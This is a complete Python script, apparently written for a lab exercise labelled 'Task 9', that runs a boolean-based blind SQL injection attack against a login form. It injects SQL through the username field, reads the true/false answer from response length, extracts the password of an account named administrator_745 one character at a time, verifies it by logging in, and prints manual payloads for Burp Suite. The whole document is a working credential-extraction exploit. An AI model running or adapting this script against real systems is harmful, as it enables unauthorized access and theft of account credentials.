#!/usr/bin/env python3
"""
Blind SQL Injection Script for Task 9
Extracts administrator_745 password using boolean-based blind SQL injection
"""

import requests
import string
import time
import sys

class BlindSQLInjection:
    def __init__(self, target_url, login_endpoint="/src/login.php"):
        self.target_url = target_url.rstrip('/')
        self.login_url = f"{self.target_url}{login_endpoint}"
        self.session = requests.Session()
        self.password = ""
        
        # Characters to test (alphanumeric + common special chars)
        self.charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
        
    def test_injection(self, payload):
        """Test a blind SQL injection payload"""
        data = {
            'username': payload,
            'password': 'anything',  # Password doesn't matter for blind injection
            'login': 'Login'
        }
        
        try:
            response = self.session.post(self.login_url, data=data, timeout=10)
            return response
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            return None
    
    def check_condition(self, condition):
        """Check if a SQL condition is true using blind injection"""
        # Payload that will cause different behavior if condition is true
        payload = f"administrator_745' AND ({condition}) -- "
        
        response = self.test_injection(payload)
        if not response:
            return False
            
        # Look for indicators that the condition was true
        # This could be response time, content length, specific text, etc.
        
        # Method 1: Check response length (we know TRUE=5202, FALSE=5201)
        current_length = len(response.text)
        
        # Based on our testing: TRUE conditions return 5202, FALSE conditions return 5201
        if current_length == 5202:
            return True
        elif current_length == 5201:
            return False
                
        # Method 2: Check for specific error messages or success indicators
        error_indicators = ["error", "syntax", "mysql", "sql"]
        success_indicators = ["welcome", "dashboard", "success"]
        
        response_text = response.text.lower()
        
        # If we see success indicators, condition might be true
        if any(indicator in response_text for indicator in success_indicators):
            return True
            
        return False
    
    def get_password_length(self, max_length=50):
        """Determine the length of the administrator password"""
        print("🔍 Determining password length...")
        
        for length in range(1, max_length + 1):
            condition = f"(SELECT LENGTH(password) FROM users WHERE username='administrator_745')={length}"
            
            if self.check_condition(condition):
                print(f"✅ Password length: {length}")
                return length
            
            print(f"❌ Length {length}: False", end='\r')
            time.sleep(0.1)  # Be nice to the server
        
        print(f"\n⚠️  Password length not found (tested up to {max_length})")
        return None
    
    def extract_password_char(self, position):
        """Extract a single character at the given position"""
        print(f"🔍 Extracting character at position {position}...")
        
        for char in self.charset:
            # Escape single quotes in the character
            escaped_char = char.replace("'", "''")
            
            condition = f"(SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator_745')='{escaped_char}'"
            
            if self.check_condition(condition):
                print(f"✅ Position {position}: '{char}'")
                return char
            
            print(f"❌ Testing '{char}'", end='\r')
            time.sleep(0.1)
        
        print(f"\n⚠️  Character at position {position} not found")
        return None
    
    def extract_full_password(self):
        """Extract the complete administrator password"""
        print("🎯 Starting Blind SQL Injection Attack")
        print("=" * 50)
        
        # First, determine password length
        password_length = self.get_password_length()
        if not password_length:
            print("❌ Could not determine password length")
            return None
        
        print(f"\n🔑 Extracting password (length: {password_length})")
        print("-" * 30)
        
        # Extract each character
        for position in range(1, password_length + 1):
            char = self.extract_password_char(position)
            if char:
                self.password += char
                print(f"🔐 Current password: {self.password}")
            else:
                print(f"❌ Failed to extract character at position {position}")
                break
        
        return self.password
    
    def verify_password(self):
        """Verify the extracted password works"""
        if not self.password:
            print("❌ No password to verify")
            return False
            
        print(f"\n🔍 Verifying password: {self.password}")
        
        data = {
            'username': 'administrator_745',
            'password': self.password,
            'login': 'Login'
        }
        
        response = self.session.post(self.login_url, data=data)
        
        if response and "welcome" in response.text.lower():
            print("✅ Password verified successfully!")
            return True
        else:
            print("❌ Password verification failed")
            return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 blind_sqli.py <target_url>")
        print("Example: python3 blind_sqli.py http://localhost:8080")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("🎯 Blind SQL Injection Tool - Task 9")
    print("=" * 50)
    print(f"Target: {target_url}")
    print(f"Username: administrator_745")
    print()
    
    # Create injector instance
    injector = BlindSQLInjection(target_url)
    
    # Test basic connectivity
    print("🔍 Testing connectivity...")
    test_response = injector.test_injection("test")
    if not test_response:
        print("❌ Cannot connect to target")
        sys.exit(1)
    print("✅ Connected successfully")
    
    # Extract the password
    password = injector.extract_full_password()
    
    if password:
        print("\n🎉 SUCCESS!")
        print("=" * 30)
        print(f"Username: administrator_745")
        print(f"Password: {password}")
        
        # Verify the password
        injector.verify_password()
        
        print("\n📝 Manual Burp Suite Payloads:")
        print("-" * 30)
        for i, char in enumerate(password, 1):
            escaped_char = char.replace("'", "''")
            payload = f"administrator_745' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator_745')='{escaped_char}' -- "
            print(f"Position {i}: {payload}")
            
    else:
        print("\n❌ Failed to extract password")

if __name__ == "__main__":
    main() 